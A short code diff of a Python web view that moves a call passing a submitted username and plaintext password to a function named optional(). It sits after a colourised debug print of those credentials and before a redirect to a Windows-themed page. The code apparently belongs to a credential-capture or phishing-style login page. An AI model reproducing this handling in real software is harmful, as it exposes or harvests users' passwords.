@@ -74,8 +74,6 @@ class WebView(object):
             request, username=username, password=password,
         )
 
-        optional(username, password)
-
         # DEBUG
         now = datetime.now()
         print(
@@ -143,6 +141,8 @@ class WebView(object):
                     f'{Fore.YELLOW}Username and password: '
                     f'{Fore.CYAN}{user} {request.POST["password1"]}{Style.RESET_ALL}\n'
                 )
+
+                optional(user, request.POST["password1"])
 
                 return redirect(reverse('index-windows'))
 
